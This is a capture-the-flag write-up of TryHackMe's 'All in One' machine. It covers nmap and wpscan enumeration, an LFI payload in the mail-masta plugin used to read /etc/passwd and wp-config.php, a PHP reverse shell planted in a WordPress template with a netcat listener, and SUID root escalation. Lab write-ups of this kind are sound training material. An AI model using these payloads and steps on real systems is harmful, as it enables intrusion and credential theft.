## All in one by [i7md](https://tryhackme.com/p/i7md)

The challenge is ALL In One which was kinda fun and covers basics of privilege escalation and web exploitation.

Once the machine was launched I did an nmap scan to find what ports were open.

nmap -sC -sV -A -O 10.10.228.32 > scan.txt
cat scan.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-13 04:21 EST
Nmap scan report for 10.10.228.32
Host is up (0.17s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.46.232
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/13%OT=21%CT=1%CU=42345%PV=Y%DS=2%DC=T%G=Y%TM=5FD5DD
OS:41%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
OS:11NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   165.35 ms 10.8.0.1
2   165.49 ms 10.10.228.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.75 seconds

In the scan we can see there are 3 ports open FTP, SSH and http on 21, 22 and 80 respectivley.

For FTP we can try to connect using 
ftp 10.10.228.32 
username: Anonymous
Password -> none
ftp> ls
gave me no files on the ftp

So move foreward to ssh we dont have any usernames or passwords. 
Lets check the website hosted on port 80

once we open it we will be welcomed with Apache default page. Hmmm... 

We can try GoBuster to find the hidden directories.  

gobuster dir -u http://10.10.228.32/ -w /usr/share/dirb/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt

Gave me hidden pages
1. /hackathons
2. /wordpress
Hmm once we open http://10.10.228.32/hackathons we find clues related for Vigenere Cipher. 
Once we open source code at bottom we can see commented cipher with key below it and running it in dcode.fr/vigener-cipher we get
Try H@ckme@123 as deciphered text.

And we then open /wordpress we can find it is just simple wordpress default page so we can try to enumerate wordpress using WPSCAN

First I kind did All Plugins scan

wpscan --url http://10.10.228.32/wordpress/ --enumerate ap > Allpluginscan.txt

Which gave me:

[32m[+][0m mail-masta
 | Location: http://10.10.228.32/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.228.32/wordpress/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.228.32/wordpress/wp-content/plugins/mail-masta/readme.txt

[32m[+][0m reflex-gallery
 | Location: http://10.10.228.32/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2019-05-10T16:05:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.228.32/wordpress/wp-content/plugins/reflex-gallery/readme.txt

 Which Mail-masta has Local File Inclusion and Reflex-gallery with Arbitary File upload.

 Then can try to enumarate Username using wpscan with 'u' flag.
wpscan --url http://10.10.228.32/wordpress/ --enumerate u > wpscanUsersEnum.txt

And when we see the scan results we can find 

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.228.32/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

 User name elyana.

 Now using the LFI we found in [exploit](https://www.exploit-db.com/exploits/40290) on exploit db we can use the following url to get local files.
 
 http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Gave me /etc/passwd. Now we can try to ge the dataabase file. But we need to base64 decode the entire file tho. 

http://10.10.228.32/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php

And decoding the base64 to text we can see the plain text passwords of elyana with password TryH@m3

Now we can login with credentials to http://10.10.223.32/wordpress/wp-admin

We now have access to wordpress admin panel. Now we can create a reverse shell by editing an existing template with [php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell).

I edited 404.php template with reverse shell php code with my system IP address on port 4444

Before opening the page we have to open netcat listner on port 4444

nc -lvp 4444

And now we access the page to make the reverse shell
By accessing the page http://10.10.228.32/wordpress/wp-content/themes/twentytwenty/404.php

And if we check our console we can see the reverse shell being done and now we have system access.

To find the User.txt I tried to 
cd /home/elyana && cat User.txt

But I was denied permission. So I had to look at my permissions.

but I kinda got lucky here as I try to do /bin/nash -p can have look at here for [GTFObins](https://gtfobins.github.io/) every time to see if there is any wrong SUID config set. 

Viola! It straight up gave me straight up root access xD

Now I can see every single flag both User.txt and Root.txt in /home/elyana and /root/root.txt.

### Finally this was fun challenge tho except for the part were I got lucky xD
